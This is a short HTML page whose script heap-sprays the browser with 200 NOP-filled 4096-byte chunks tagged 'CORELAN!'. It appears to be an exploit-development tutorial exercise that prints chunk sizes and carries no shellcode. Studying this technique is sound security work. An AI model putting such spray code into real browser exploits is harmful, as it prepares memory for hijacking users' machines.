<html>
<script >

tag = unescape('%u4F43%u4552'); // CORE
tag += unescape('%u414C%u214E'); // LAN!

chunk = '';
chunksize = 0x4000; // 4096
nr_of_chunks = 200;

for ( counter = 0; counter < chunksize; counter++)
{
 chunk += unescape('%u9090%u9090'); // nops 0x1000 (4096) * 2 = 8192
}

document.write("size of 'CORELAN!' tag: " + tag.length.toString() + "<br>");  // 4 bytes (supposed to be 8? unescape halves it)
document.write("size of NOPS at this point : " + chunk.length.toString() + "<br>"); // 8192 bytes
chunk = chunk.substring(0,chunksize - tag.length); // chunksize - tag.length = 4092
document.write("size of NOPS after substring : " + chunk.length.toString() + "<br>"); // hence it should be 4092

testarray = new Array();
for ( counter = 0; counter < nr_of_chunks; counter++)
{
 testarray[counter] = tag + chunk; // each chunk is 4096 bytes, where it consist of CORELAN! tag and the rest filled with nops
 document.write("Allocated " + (tag.length+chunk.length).toString() + " bytes <br>");
}

alert("Spray done")
</script>
</html>